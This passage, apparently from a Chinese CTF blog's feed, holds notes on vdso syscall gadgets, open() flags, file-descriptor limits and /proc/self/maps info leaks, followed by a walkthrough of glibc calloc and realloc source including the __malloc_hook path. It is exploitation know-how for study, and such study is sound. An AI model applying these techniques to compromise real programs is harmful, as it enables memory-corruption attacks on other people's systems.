title="vdso"></a>vdso</h2><p>elf运行时会有内存映射vdso</p><p>dump下来可以发现其中存在一些有用的gadget,例如sycall….,而且与<u>vsyscall</u>中的syscall不能拆分使用不同,这个是可以使用的</p><p>此外在栈上环境变量(environ)之上<u>会保存有vdso的起始地址</u></p><p>一些特殊情况可能用得上</p><h1 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h1><h2 id="open调用"><a href="#open调用" class="headerlink" title="open调用"></a>open调用</h2><p>某次比赛因为open参数的原因折腾了不久,浅浅学一下</p><h3 id="open调用参数"><a href="#open调用参数" class="headerlink" title="open调用参数"></a>open调用参数</h3><h4 id="oflags"><a href="#oflags" class="headerlink" title="oflags"></a>oflags</h4><p>oflags是由诸多bit组成的标志位,各标志的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* File access modes for `open&#x27; and `fcntl&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_RDONLY0<span class="comment">/* Open read-only.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_WRONLY1<span class="comment">/* Open write-only.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_RDWR2<span class="comment">/* Open read/write.  */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits OR&#x27;d into the second argument to open.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_CREAT0x0200<span class="comment">/* Create file if it doesn&#x27;t exist.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_EXCL0x0800<span class="comment">/* Fail if file already exists.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_TRUNC0x0400<span class="comment">/* Truncate file to zero length.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_NOCTTY0x8000<span class="comment">/* Don&#x27;t assign a controlling terminal.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_ASYNC0x0040<span class="comment">/* Send SIGIO to owner when data is ready.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_FSYNC0x0080<span class="comment">/* Synchronous writes.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_SYNCO_FSYNC</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>__USE_MISC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_SHLOCK0x0010<span class="comment">/* Open with shared file lock.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_EXLOCK0x0020<span class="comment">/* Open with shared exclusive lock.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __USE_XOPEN2K8</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_DIRECTORY0x00200000<span class="comment">/* Must be a directory. */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_NOFOLLOW0x00000100<span class="comment">/* Do not follow links. */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_CLOEXEC0x00400000      <span class="comment">/* Set close_on_exec.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined __USE_POSIX199309 || defined __USE_UNIX98</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_DSYNC0x00010000<span class="comment">/* Synchronize data.  */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_RSYNC0x00020000<span class="comment">/* Synchronize read operations. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* All opens support large file sizes, so there is no flag bit for this.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __USE_LARGEFILE64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_LARGEFILE0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* File status flags for `open&#x27; and `fcntl&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_APPEND0x0008<span class="comment">/* Writes append to the file.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_NONBLOCK0x0004<span class="comment">/* Non-blocking I/O.  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __USE_MISC</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_NDELAYO_NONBLOCK</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>常用的有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">O_RDONLY：以只读方式打开文件。</span><br><span class="line">O_WRONLY：以只写方式打开文件。</span><br><span class="line">O_RDWR：以读写方式打开文件。</span><br><span class="line">O_CREAT：如果文件不存在，则创建文件。</span><br><span class="line">O_EXCL：与O_CREAT一起使用，用于确保文件的创建是独占的，即如果文件已经存在，则open调用会失败。</span><br><span class="line">O_TRUNC：如果文件已经存在，在打开文件时将其截断为空文件。</span><br><span class="line">O_APPEND：在文件末尾追加数据而不是覆盖已有数据。</span><br><span class="line">O_NONBLOCK：以非阻塞方式打开文件。</span><br></pre></td></tr></table></figure><h4 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h4><p>open系统调用的第三个参数mode是一个无符号整数，用于指定文件的访问权限（仅在创建文件时生效，即当flags中包含O_CREAT时）。</p><p>它定义了文件所有者、所属组和其他用户对文件的读、写和执行权限。</p><p>当oflags没有O_CREAT标志时无意义</p><h3 id="文件标识符上限"><a href="#文件标识符上限" class="headerlink" title="文件标识符上限"></a>文件标识符上限</h3><p>使用open调用打开文件时会分配一个文件标识符</p><p>通常一个进程能够打开的文件标识符数量是有限的</p><p>可以使用<code>ulimit -n</code>查看,一般是1024</p><p>如果超过了这个数字,那么将打开失败,进而导致读取失败</p><p>除去进程自动打开的stdin,stdout,stderr三个文件流的标识符,我们还能再打开1021个标识符</p><p>再多的话就会打开失败</p><p>一个示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">1024</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> buf=<span class="number">0</span>;</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;%d\n&quot;</span>,i,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a>/proc/self/maps</h2><p>每个进程在<code>/proc</code>目录下都存在一个记录该进程信息的文件夹</p><p>命名是<code>/proc/pid</code></p><p>其中有一个maps文本文件,会记载进程的各个段的映射信息</p><p>某些情况下可以利用其泄露一些信息,</p><p>在大多数不知道pid的情况下,只需要进程内引用<code>/proc/self/maps</code>,就会自动指向该进程的对应文件夹</p>]]></content>
    
    
    <summary type="html">linux</summary>
    
    
    
    <category term="杂烩" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="linux" scheme="https://ixout.github.io/tags/linux/"/>
    
    <category term="杂烩" scheme="https://ixout.github.io/tags/%E6%9D%82%E7%83%A9/"/>
    
  </entry>
  
  <entry>
    <title>calloc&amp;realloc</title>
    <link href="https://ixout.github.io/posts/14246/"/>
    <id>https://ixout.github.io/posts/14246/</id>
    <published>2023-09-09T09:04:39.000Z</published>
    <updated>2023-11-26T09:25:26.198Z</updated>
    
    <content type="html"><![CDATA[<h1 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h1><p>原型__libc_calloc (size_t n, size_t elem_size)</p><p>开始声明了一堆变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mstate av;</span><br><span class="line">mchunkptr oldtop, p;</span><br><span class="line">INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;</span><br><span class="line"><span class="type">void</span> *mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> clearsize;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nclears;</span><br><span class="line">INTERNAL_SIZE_T *d;</span><br></pre></td></tr></table></figure><p>得到申请大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes = n * elem_size;</span><br></pre></td></tr></table></figure><p>大小检测??</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_INTERNAL_SIZE_T \</span></span><br><span class="line"><span class="meta">  (((INTERNAL_SIZE_T) 1) &lt;&lt; (8 * sizeof (INTERNAL_SIZE_T) / 2))</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((n | elem_size) &gt;= HALF_INTERNAL_SIZE_T, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (elem_size != <span class="number">0</span> &amp;&amp; bytes / elem_size != n)</span><br><span class="line">        &#123;</span><br><span class="line">          __set_errno (ENOMEM);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>hook</strong>,定义一个函数指针,值来自__malloc_hook,不为空则调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">  atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    sz = bytes;</span><br><span class="line">    mem = (*hook)(sz, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>一些准备工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  sz = bytes;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    av = &amp;main_arena;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    arena_get (av, sz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check if we hand out the top chunk, in which case there may be no</span></span><br><span class="line"><span class="comment"> need to clear. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">      oldtop = top (av);</span><br><span class="line">      oldtopsize = chunksize (top (av));</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> MORECORE_CLEARS &lt; 2</span></span><br><span class="line">      <span class="comment">/* Only newly allocated memory is guaranteed to be cleared.  */</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena &amp;&amp;</span><br><span class="line">  oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop)</span><br><span class="line">oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">&#123;</span><br><span class="line">  heap_info *heap = heap_for_ptr (oldtop);</span><br><span class="line">  <span class="keyword">if</span> (oldtopsize &lt; (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop)</span><br><span class="line">    oldtopsize = (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* No usable arenas.  */</span></span><br><span class="line">      oldtop = <span class="number">0</span>;</span><br><span class="line">      oldtopsize = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>核心依然是__int_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">        av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure><p>非单线程情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!SINGLE_THREAD_P)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (mem == <span class="number">0</span> &amp;&amp; av != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_calloc_retry, <span class="number">1</span>, sz);</span><br><span class="line">  av = arena_get_retry (av, sz);</span><br><span class="line">  mem = _int_malloc (av, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (av != <span class="literal">NULL</span>)</span><br><span class="line">__libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>分配失败</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocation failed even after a retry.  */</span></span><br><span class="line"> <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>成功之后,如果是mmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two optional cases in which clearing not necessary */</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>不然,chunk置零并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  csz = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">  <span class="keyword">if</span> (perturb_byte == <span class="number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* clear only the bytes from non-freshly-sbrked memory */</span></span><br><span class="line">      csz = oldtopsize;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span></span><br><span class="line"><span class="comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span></span><br><span class="line"><span class="comment">     minimally 3.  */</span></span><br><span class="line">  d = (INTERNAL_SIZE_T *) mem;</span><br><span class="line">  clearsize = csz - SIZE_SZ;</span><br><span class="line">  nclears = clearsize / <span class="keyword">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">  assert (nclears &gt;= <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nclears &gt; <span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (d, <span class="number">0</span>, clearsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(d + <span class="number">0</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (nclears &gt; <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          *(d + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">          *(d + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (nclears &gt; <span class="number">6</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">              *(d + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (nclears &gt; <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  *(d + <span class="number">7</span>) = <span class="number">0</span>;</span><br><span class="line">                  *(d + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>calloc与malloc的核心都是__int_malloc</p><p>而这其实并没有什么太大的差别</p><p>比较大的不同两点:</p><ol><li><strong>calloc会将返回的chunk的mem全部置零</strong></li><li><strong>__libc_calloc函数并不使用tcache</strong></li></ol><h1 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h1><p>原型为void <em> __libc_realloc (void </em>oldmem, size_t bytes)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>首先如果bytes为0,且oldmem存在,将其free并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br></pre></td></tr></table></figure><p>如果oldmem为null,那么改为调用__libc_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (bytes &lt;= usable)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">size_t</span> difference = usable - bytes;</span><br><span class="line">     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) difference &lt; <span class="number">2</span> * <span class="keyword">sizeof</span> (INTERNAL_SIZE_T)</span><br><span class="line">  || (chunk_is_mmapped (oldp) &amp;&amp; difference &lt;= GLRO (dl_pagesize)))</span><br><span class="line"><span class="keyword">return</span> oldmem;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果申请大小小于已使用大小,且差距小于2*size_t直接返回旧oldmem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MREMAP</span></span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      <span class="keyword">if</span> (newp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *newmem = chunk2mem_tag (newp);</span><br><span class="line">  <span class="comment">/* Give the new block a different tag.  This helps to ensure</span></span><br><span class="line"><span class="comment">     that stale handles to the previous mapping are not</span></span><br><span class="line"><span class="comment">     reused.  There&#x27;s a performance hit for both us and the</span></span><br><span class="line"><span class="comment">     caller for doing this, so we might want to</span></span><br><span class="line"><span class="comment">     reconsider.  */</span></span><br><span class="line">  <span class="keyword">return</span> tag_new_usable (newmem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class="line">      <span class="keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class="line">        <span class="keyword">return</span> oldmem;                         <span class="comment">/* do nothing */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Must alloc, copy, free. */</span></span><br><span class="line">      newmem = __libc_malloc (bytes);</span><br><span class="line">      <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;              <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">memcpy</span> (newmem, oldmem, oldsize - CHUNK_HDR_SZ);</span><br><span class="line">      munmap_chunk (oldp);</span><br><span class="line">      <span class="keyword">return</span> newmem;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原先的chunk是mmap分配的</p><p>newmem使用__libc_malloc分配,并使用memcpy函数将oldmem中的数据转移到newmem</p><p>并munmap原先的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">  &#123;</span><br><span class="line">    newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">    assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">     ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">__libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">__libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">        ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (newp == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class="line">    LIBC_PROBE (memory_realloc_retry, <span class="number">2</span>, bytes, oldmem);</span><br><span class="line">    newp = __libc_malloc (bytes);</span><br><span class="line">    <span class="keyword">if</span> (newp != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line"> <span class="type">size_t</span> sz = memsize (oldp);</span><br><span class="line"> <span 